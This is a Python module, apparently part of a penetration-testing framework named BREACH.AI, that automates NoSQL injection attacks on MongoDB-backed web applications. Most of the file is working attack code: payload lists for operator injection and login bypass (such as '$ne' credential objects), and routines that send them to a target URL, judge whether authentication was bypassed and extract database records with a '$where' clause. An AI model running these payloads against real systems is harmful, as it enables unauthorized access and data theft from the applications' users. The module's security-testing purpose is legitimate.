"""
BREACH.AI - NoSQL Injection Attack Module

Tests for NoSQL injection vulnerabilities in MongoDB and other NoSQL databases.
"""

import json
from typing import Optional

from breach.attacks.base import AttackResult, BaseAttack
from breach.core.memory import AccessLevel, Severity
from breach.utils.http import HTTPClient, HTTPResponse
from breach.utils.logger import logger


class NoSQLInjectionAttack(BaseAttack):
    """NoSQL Injection attack module for MongoDB and similar databases."""

    name = "NoSQL Injection"
    attack_type = "nosqli"
    description = "Tests for NoSQL injection vulnerabilities"
    severity = Severity.CRITICAL
    owasp_category = "A03:2021 Injection"
    cwe_id = 943

    # MongoDB operator injection payloads
    OPERATOR_PAYLOADS = [
        {"$gt": ""},
        {"$ne": ""},
        {"$regex": ".*"},
        {"$exists": True},
        {"$gt": None},
        {"$where": "1==1"},
    ]

    # String-based payloads (for query string injection)
    STRING_PAYLOADS = [
        "' || '1'=='1",
        '{"$gt": ""}',
        '{"$ne": null}',
        "[$ne]=",
        "[$gt]=",
        "[$regex]=.*",
        "username[$ne]=&password[$ne]=",
        "username[$gt]=&password[$gt]=",
    ]

    # Auth bypass payloads
    AUTH_BYPASS = [
        {"username": {"$ne": ""}, "password": {"$ne": ""}},
        {"username": {"$gt": ""}, "password": {"$gt": ""}},
        {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
        {"username": "admin", "password": {"$ne": ""}},
        {"username": {"$in": ["admin", "administrator"]}, "password": {"$ne": ""}},
    ]

    # Data extraction payloads
    EXTRACTION_PAYLOADS = [
        {"$where": "function() { return true; }"},
        {"$where": "this.password.match(/.*/)"},
    ]

    def get_payloads(self) -> list[str]:
        return self.STRING_PAYLOADS

    async def check(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> bool:
        """Check for NoSQL injection vulnerability."""
        if not parameter:
            # Try detecting on login-like endpoints
            return "login" in url.lower() or "auth" in url.lower()

        # Try basic operator injection
        for payload in self.STRING_PAYLOADS[:3]:
            response = await self._send_payload(url, parameter, payload, method)

            # Look for different response indicating injection worked
            if self._detect_injection(response):
                return True

        return False

    async def exploit(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> AttackResult:
        """Exploit NoSQL injection vulnerability."""
        result = self._create_result(False, url, parameter)

        # Step 1: Try operator injection via query string
        if parameter:
            string_result = await self._try_string_injection(url, parameter, method)
            if string_result:
                result.success = True
                result.payload = string_result["payload"]
                result.details = "NoSQL injection via query parameter"
                result.response = string_result.get("response", "")
                result.add_evidence("nosqli_param", "Query parameter injection", string_result["payload"])

        # Step 2: Try JSON body injection (for POST endpoints)
        if method.upper() == "POST" or not result.success:
            json_result = await self._try_json_injection(url)
            if json_result:
                result.success = True
                result.payload = str(json_result["payload"])
                result.details = "NoSQL injection via JSON body"
                result.access_gained = json_result.get("access", AccessLevel.USER)
                result.add_evidence("nosqli_json", "JSON body injection", str(json_result["payload"]))

        # Step 3: Try auth bypass if it's a login endpoint
        if "login" in url.lower() or "auth" in url.lower():
            auth_result = await self._try_auth_bypass(url)
            if auth_result:
                result.success = True
                result.payload = str(auth_result["payload"])
                result.details = "NoSQL injection authentication bypass"
                result.access_gained = AccessLevel.ADMIN
                result.add_evidence("nosqli_auth", "Authentication bypassed", str(auth_result["payload"]))

        # Step 4: Try data extraction
        if result.success:
            extracted = await self._extract_data(url, result.payload)
            if extracted:
                result.data_sample = extracted
                result.add_evidence("nosqli_data", "Data extracted via NoSQL injection", extracted[:500])

        return result

    async def _try_string_injection(
        self,
        url: str,
        parameter: str,
        method: str
    ) -> Optional[dict]:
        """Try string-based NoSQL injection."""
        baseline = await self._send_payload(url, parameter, "test", method)

        for payload in self.STRING_PAYLOADS:
            response = await self._send_payload(url, parameter, payload, method)

            if self._is_successful_injection(response, baseline):
                return {
                    "payload": payload,
                    "response": response.body[:500],
                }

        # Try array-style injection
        array_payloads = [
            f"{parameter}[$ne]=",
            f"{parameter}[$gt]=",
            f"{parameter}[$regex]=.*",
        ]

        for payload in array_payloads:
            test_url = url + ("&" if "?" in url else "?") + payload
            response = await self.http_client.get(test_url)

            if self._is_successful_injection(response, baseline):
                return {
                    "payload": payload,
                    "response": response.body[:500],
                }

        return None

    async def _try_json_injection(self, url: str) -> Optional[dict]:
        """Try JSON body NoSQL injection."""
        # Try each operator payload
        for payload in self.OPERATOR_PAYLOADS:
            try:
                # Wrap in common field names
                test_payloads = [
                    {"query": payload},
                    {"filter": payload},
                    {"search": payload},
                    payload,
                ]

                for test_payload in test_payloads:
                    response = await self.http_client.post(
                        url,
                        json=test_payload,
                        headers={"Content-Type": "application/json"}
                    )

                    if response.is_success and self._detect_injection(response):
                        return {
                            "payload": test_payload,
                            "access": AccessLevel.DATABASE,
                        }

            except Exception as e:
                logger.debug(f"JSON injection attempt failed: {e}")

        return None

    async def _try_auth_bypass(self, url: str) -> Optional[dict]:
        """Try NoSQL authentication bypass."""
        for payload in self.AUTH_BYPASS:
            try:
                response = await self.http_client.post(
                    url,
                    json=payload,
                    headers={"Content-Type": "application/json"}
                )

                # Check for successful auth indicators
                if self._is_auth_successful(response):
                    return {"payload": payload}

            except Exception:
                continue

        return None

    async def _extract_data(self, url: str, working_payload: str) -> Optional[str]:
        """Try to extract data using the injection."""
        # This is a simplified version - real extraction would be more sophisticated
        extraction_payloads = [
            {"$where": "function() { return JSON.stringify(this); }"},
        ]

        for payload in extraction_payloads:
            try:
                response = await self.http_client.post(
                    url,
                    json=payload,
                    headers={"Content-Type": "application/json"}
                )

                if response.is_success and len(response.body) > 50:
                    return response.body[:1000]

            except Exception:
                continue

        return None

    def _detect_injection(self, response: HTTPResponse) -> bool:
        """Detect indicators of successful NoSQL injection."""
        body_lower = response.body.lower()

        # Error messages indicating MongoDB
        mongo_indicators = [
            "mongodb",
            "bson",
            "objectid",
            "$where",
            "syntaxerror",
            "illegal",
            "unexpected token",
        ]

        for indicator in mongo_indicators:
            if indicator in body_lower:
                return True

        return False

    def _is_successful_injection(
        self,
        response: HTTPResponse,
        baseline: HTTPResponse
    ) -> bool:
        """Check if injection was successful by comparing responses."""
        # Different response code
        if response.status_code != baseline.status_code:
            if response.is_success:
                return True

        # Significantly different response size
        if abs(len(response.body) - len(baseline.body)) > 100:
            return True

        # More data in response
        if len(response.body) > len(baseline.body) * 1.5:
            return True

        return False

    def _is_auth_successful(self, response: HTTPResponse) -> bool:
        """Check if authentication bypass was successful."""
        # Check for success indicators
        success_indicators = [
            "welcome",
            "dashboard",
            "logout",
            "profile",
            "token",
            "session",
        ]

        failure_indicators = [
            "invalid",
            "incorrect",
            "failed",
            "error",
            "unauthorized",
        ]

        body_lower = response.body.lower()

        has_success = any(ind in body_lower for ind in success_indicators)
        has_failure = any(ind in body_lower for ind in failure_indicators)

        if has_success and not has_failure:
            return True

        # Check for auth token in response
        if "token" in response.body or response.cookies:
            return True

        return False
